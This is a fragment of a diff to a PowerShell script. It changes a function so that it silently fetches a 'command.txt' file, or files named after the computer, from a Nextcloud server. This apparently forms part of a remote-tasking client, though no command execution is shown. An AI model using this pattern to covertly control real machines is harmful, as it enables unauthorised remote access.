@@ -72,14 +72,20 @@ function Nextcloud-OpenFile {
 		"X-Requested-With"="XMLHttpRequest";
 	}
 
-	$fileUrl += "$fileName"
+	if($fileName -eq "command.txt"){
+		try{
+			Invoke-RestMethod -Uri "$fileUrl/$fileName" -Headers $headers -Method Get
+		}catch{}
+	}else{
+		try{
+			Invoke-RestMethod -Uri "$fileUrl/$env:computername/$fileName" -Headers $headers -Method Get
+		}catch{
+			try{
+				Invoke-RestMethod -Uri "$fileUrl/$fileName" -Headers $headers -Method Get
+			}catch{}
+		}
+	}
 
-	try{
-		Invoke-RestMethod -Uri $fileUrl -Headers $headers -Method Get
-	}
-	catch{
-		Write-Host ""
-	}
 }
 <# Scarica un file caricato su github #>
 function Github-Download{
